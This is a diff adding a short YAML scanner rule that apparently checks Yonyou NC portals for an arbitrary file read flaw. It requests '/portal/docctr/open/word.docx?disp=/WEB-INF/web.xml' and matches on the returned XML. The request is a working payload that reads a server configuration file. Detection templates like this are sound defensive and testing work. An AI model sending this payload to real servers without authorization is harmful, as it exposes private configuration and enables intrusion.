@@ -1,0 +1,8 @@
+name: yongyou-nc-word-docx-fileread
+rules:
+  - method: GET
+    path: "/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<?xml") && response.body.bcontains(b"encoding") && response.body.bcontains(b"NC Portal")
+detail:
+  author: 666
